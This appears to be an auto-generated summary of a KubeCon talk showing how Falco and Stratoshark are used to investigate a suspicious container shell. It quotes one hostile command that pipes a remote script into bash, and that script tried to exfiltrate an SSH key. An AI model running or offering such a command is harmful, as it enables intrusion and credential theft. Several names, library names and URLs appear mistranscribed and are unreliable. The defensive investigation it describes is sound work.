---
layout: default
title:
  "Project Lightning Talk: When Falco Spots Trouble, The Shark Swims In - Gerald
  Combs"
nav_order: 244
parent: Kubecon Cloudnativecon North America 2025
type: Video Note
description:
  Gerald Combmes, creator of Wireshark and a Falco maintainer, discusses
  how Falco and Stratoshark can be used together for threat detection and investigation.
  Falco is a real-time threat detection engine that monitors system calls and can
  no...
resource: https://www.youtube.com/watch?v=phndUkSlIvs
tags:
  - kubecon-cloudnativecon-north-america-2025
  - video
  - learning
status: stable
generated:
  by: process:yt-conferences-okf
  at: 2026-09-12 00:00:00+00:00
---

# Summary

Gerald Combmes, creator of Wireshark and a Falco maintainer, discusses how Falco and Stratoshark can be used together for threat detection and investigation.
Falco is a real-time threat detection engine that monitors system calls and can now save these calls to a capture file, which can be analyzed with Stratoshark—a tool based on Wireshark but focused on system calls and log messages.
In a demonstration, Gerald shows how an alert from Falco about a suspicious shell in a container can be investigated by loading the capture file into Stratoshark, filtering for relevant process IDs, and reconstructing user input and subprocess activity.
This process reveals a malicious command that downloads and executes a script attempting to exfiltrate an SSH key.
Gerald concludes by encouraging further exploration of both tools and expressing gratitude to the open source community.

# Main Points

|   # | Main point                                                                                                                      |
| --: | ------------------------------------------------------------------------------------------------------------------------------- |
|   1 | Gerald Combmes is the creator and lead developer of Wireshark and a Falco maintainer.                                           |
|   2 | The talk focuses on how Wireshark and Falco can work together for threat detection and investigation.                           |
|   3 | Falco is a cloud-native, real-time threat detection engine that monitors system calls and sends alerts for suspicious activity. |
|   4 | The latest Falco release can save system calls to a capture file for further investigation.                                     |
|   5 | Stratoshark, based on Wireshark, allows investigation of system calls and log messages on the desktop.                          |
|   6 | Both tools use libraries: libcap (captures system calls and log messages) and libsense (enriches and contextualizes data).      |
|   7 | Demo scenario: Falco detects a shell opened in a container, providing a process ID and name.                                    |
|   8 | The capture file from Falco can be loaded into Stratoshark for analysis.                                                        |
|   9 | Stratoshark displays system call names, process names, process IDs, and event details.                                          |
|  10 | Filtering by process ID isolates system calls related to the suspicious bash process.                                           |
|  11 | "Follow falco fd stream" feature reassembles read system calls into a single stream to view user input.                         |
|  12 | The user input was "curlhrust.me.bro/install.shell \| bash", indicating a potentially malicious action.                         |
|  13 | Applying a predefined filter shows subprocesses under the bash process, including curl.                                         |
|  14 | Analysis shows curl performs network activity, writes output to a file descriptor (the pipe), and hands over to bash.           |
|  15 | Following the pipe stream reveals another bash script that prints "hello" and attempts to exfiltrate an SSH key.                |
|  16 | Stratoshark enables further investigation and drilling down into events.                                                        |
|  17 | More information is available at falco.org and stratshark.org.                                                                  |
|  18 | Additional Falco talks are scheduled for tomorrow at 3:15 in the same room.                                                     |
|  19 | Gerald thanks the open source community for his career.                                                                         |

# Video

[Watch on YouTube](https://www.youtube.com/watch?v=phndUkSlIvs)
